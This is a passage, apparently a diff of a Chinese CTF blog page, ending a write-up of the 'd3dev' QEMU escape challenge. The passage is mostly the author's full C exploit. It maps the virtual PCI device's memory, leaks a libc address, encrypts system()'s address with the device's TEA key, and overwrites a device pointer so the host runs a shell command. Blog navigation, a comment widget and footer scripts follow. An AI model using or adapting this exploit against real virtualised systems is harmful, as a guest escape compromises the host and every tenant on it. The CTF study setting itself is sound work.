class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> port_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">size_t</span> port, <span class="keyword">u_int32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">size_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">tea</span><span class="params">(<span class="keyword">size_t</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v3;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v4;   <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    v3 = m;</span><br><span class="line">    v4 = <span class="number">-957401312</span>;</span><br><span class="line">    v5 = v3;</span><br><span class="line">    result = v3 &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = result - ((v5 + v4) ^ (key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">        v5 -= (result + v4) ^ (key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">        v4 += <span class="number">1640531527</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v4);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result &lt;&lt; <span class="number">32</span> | (<span class="keyword">u_int64_t</span>)v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;iopl fail!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand_r;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">    rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    rand_r += ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)mmio_read(<span class="number">0x18</span>)) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    libc_base = rand_r - <span class="number">0x25d30</span>;</span><br><span class="line">    system_addr = libc_base + <span class="number">0x30290</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, rand_r);</span><br><span class="line"></span><br><span class="line">    key[<span class="number">0</span>] = pmio_read(<span class="number">12</span>);</span><br><span class="line">    key[<span class="number">1</span>] = pmio_read(<span class="number">16</span>);</span><br><span class="line">    key[<span class="number">2</span>] = pmio_read(<span class="number">20</span>);</span><br><span class="line">    key[<span class="number">3</span>] = pmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key%d: %p\n&quot;</span>, i, key[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t_system_addr;</span><br><span class="line">    t_system_addr = tea(system_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, <span class="number">0x67616c66</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span>, <span class="number">0x2f206c6e</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/image-20230321154453844.png"
+                      alt="image-20230321154453844"
+                ></p>
+<hr>
+<p>题目链接:<br>    <a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082/tree/main/qemu_escape" >https://github.com/196082/196082/tree/main/qemu_escape<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2023/03/18/%E5%88%9D%E6%8E%A2AFL/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">FUZZ(1):初探AFL</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;评论</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>&nbsp;-&nbsp;
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#FastCP-ctf"><span class="nav-text">FastCP-ctf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%EF%BC%81%EF%BC%81"><span class="nav-text">注意！！</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp"><span class="nav-text">综上，exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#d3dev"><span class="nav-text">d3dev</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0"><span class="nav-text">分析函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-1"><span class="nav-text">利用分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8Cexp-1"><span class="nav-text">综上，exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
